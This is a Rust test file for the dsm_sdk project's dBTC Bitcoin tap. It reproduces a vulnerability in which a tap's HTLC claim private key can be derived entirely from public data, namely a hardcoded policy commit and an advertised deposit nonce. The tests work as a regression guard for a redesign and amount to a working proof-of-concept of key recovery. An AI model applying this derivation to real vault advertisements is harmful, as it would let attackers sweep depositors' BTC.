// SPDX-License-Identifier: MIT OR Apache-2.0
//! THE dBTC PUBLIC-WITNESS THEFT VECTOR, reproduced.
//!
//! These tests exist to FAIL LOUDLY if the current construction is ever
//! restored. They encode a live vulnerability, not a hypothetical one:
//!
//! ```text
//! DBTC_POLICY_COMMIT      hardcoded constant in this open-source repo
//!   -> manifold_seed      = BLAKE3(TAG_DSM_MANIFOLD_SEED, policy_commit)
//!                           manifold_seeds.rs: "pure math ... no per-device
//!                           randomness ... every device computes the same seed"
//!   -> deposit_nonce      PUBLISHED in the vault advertisement (proto field 17)
//!   -> eta                = BLAKE3(dbtc-bearer-eta, seed || nonce)
//!   -> preimage           = BLAKE3(dbtc-preimage, eta)
//!   -> claim_privkey      = BLAKE3(TAG_DSM_DBTC_CLAIM, preimage || hash_lock)
//!   -> witness [sig, preimage, TRUE, redeemScript]  SWEEPS THE UTXO
//! ```
//!
//! Every input is public. Anyone who can read an unauthenticated storage-node
//! advertisement can compute the Bitcoin private key controlling that tap and
//! steal 100% of its BTC. The exposure is independent of the accepting-layer
//! mint refusal: the BTC is locked on-chain the moment the funding transaction
//! is broadcast, and the mint refusal only blocks the dBTC credit.
//!
//! This is not an implementation slip. It follows necessarily from the old
//! formal definitions — a future bearer redeems, the depositor is absent, the
//! witness is never transferred and never stored, and it is reconstructed from
//! vault/policy bytes. The only object satisfying all of those at once is a
//! witness made of public data.
//!
//! Test A is the standing MUTATION CONTROL for the whole dBTC redesign: if a
//! future implementation restores `sk = f(public data)`, A goes red.

#![allow(clippy::disallowed_methods)]

use dsm_sdk::sdk::bitcoin_tap_sdk::BitcoinTapSdk;
use dsm_sdk::sdk::bitcoin_tx_builder::derive_claim_keypair;

/// The builtin dBTC policy commit — a compile-time constant in the published
/// source tree. An attacker does not need to observe anything to know it.
fn dbtc_policy_commit() -> [u8; 32] {
    dsm::core::token::builtin_policy_commit_for_token("dBTC").expect("dBTC is a builtin")
}

/// The single public value an attacker reads off a storage-node advertisement
/// (`DbtcVaultAdvertisementV1` field 17). Its randomness protects nothing: it
/// is published precisely so that "bearers" can derive the spend secret.
fn advertised_deposit_nonce() -> [u8; 32] {
    [0x5Au8; 32]
}

/// A — THE THEFT. From public data alone, derive the Bitcoin spend authority
/// for a tap and prove it is the authority the HTLC actually commits to.
///
/// MUTATION CONTROL for the redesign: restore any construction where the tap
/// key is a function of public data and this test goes red by producing a
/// spendable key.
#[test]
fn public_data_alone_yields_the_tap_bitcoin_spend_key() {
    let policy_commit = dbtc_policy_commit();
    let deposit_nonce = advertised_deposit_nonce();

    // One public call. Both arguments are public; the doc comment on this
    // function advertises it as the path for nonces taken from storage-node
    // advertisements.
    let preimage =
        BitcoinTapSdk::derive_preimage_from_deposit_nonce(&deposit_nonce, &policy_commit)
            .expect("the preimage derives from public inputs alone");

    // The hash lock is the SHA256 of that preimage — this is the value the
    // on-chain script commits to, so an attacker can confirm a match against
    // any advertised vault before spending a satoshi of fees.
    let hash_lock = dsm::bitcoin::script::sha256_hash_lock(&preimage);

    // ... and the claim keypair follows deterministically.
    let (claim_privkey, claim_pubkey) =
        derive_claim_keypair(&preimage, &hash_lock).expect("claim key derives");

    // The derived private key is a valid secp256k1 key whose public key is the
    // one the HTLC's claim branch is built around.
    use bitcoin::secp256k1::{Secp256k1, SecretKey};
    let secp = Secp256k1::new();
    let sk = SecretKey::from_slice(&claim_privkey).expect("valid secp256k1 secret key");
    assert_eq!(
        sk.public_key(&secp).serialize(),
        claim_pubkey,
        "the derived secret key controls the advertised claim pubkey"
    );

    // And the script that would be funded on-chain commits to exactly it, so
    // the attacker can compute the victim's own funding address and watch it.
    let refund_pubkey = [0x02u8; 33];
    let refund_hash_lock = [0x77u8; 32];
    let script = dsm::bitcoin::build_htlc_script(
        &hash_lock,
        &refund_hash_lock,
        &claim_pubkey,
        &refund_pubkey,
    )
    .expect("script builds");
    assert!(
        script
            .windows(claim_pubkey.len())
            .any(|w| w == claim_pubkey.as_slice()),
        "the HTLC script commits to the publicly-derived claim pubkey — whoever \
         derives it can satisfy the claim branch"
    );

    // Determinism across "devices": the same public inputs give the same key
    // everywhere, which is exactly what makes this a global theft rather than
    // a local quirk.
    let again = BitcoinTapSdk::derive_preimage_from_deposit_nonce(&deposit_nonce, &policy_commit)
        .expect("derives again");
    assert_eq!(
        preimage, again,
        "every device computes the same spend secret from the same public inputs"
    );
}

/// B — THE DEPOSITOR IS NOT SPECIAL. Creating the tap confers no privileged
/// position: the depositor's wallet holds nothing an observer lacks, because
/// the spend authority is a pure function of published values.
///
/// This is the property a sealed per-tap authority must invert — after the
/// redesign, tap authority must NOT be derivable by anyone from public data,
/// and this test must be rewritten to assert the opposite.
#[test]
fn the_tap_spend_key_is_not_a_depositor_secret() {
    let policy_commit = dbtc_policy_commit();
    let nonce = advertised_deposit_nonce();

    // The "depositor" derives their spend authority.
    let depositor_preimage =
        BitcoinTapSdk::derive_preimage_from_deposit_nonce(&nonce, &policy_commit)
            .expect("depositor derives");

    // A stranger with no wallet, no device, no database and no relationship to
    // the depositor derives the identical value from the advertisement.
    let stranger_preimage =
        BitcoinTapSdk::derive_preimage_from_deposit_nonce(&nonce, &policy_commit)
            .expect("stranger derives");

    assert_eq!(
        depositor_preimage, stranger_preimage,
        "the depositor holds NO secret: a stranger reconstructs the same spend \
         authority from the advertisement and the published policy commit"
    );

    // Different vaults are distinguished only by their advertised nonce, so
    // enumerating advertisements enumerates spend keys.
    let other_nonce = [0xA5u8; 32];
    let other = BitcoinTapSdk::derive_preimage_from_deposit_nonce(&other_nonce, &policy_commit)
        .expect("derives");
    assert_ne!(
        depositor_preimage, other,
        "per-vault separation exists, but it is keyed on a PUBLISHED value — it \
         separates vaults from each other, never the attacker from the funds"
    );
}
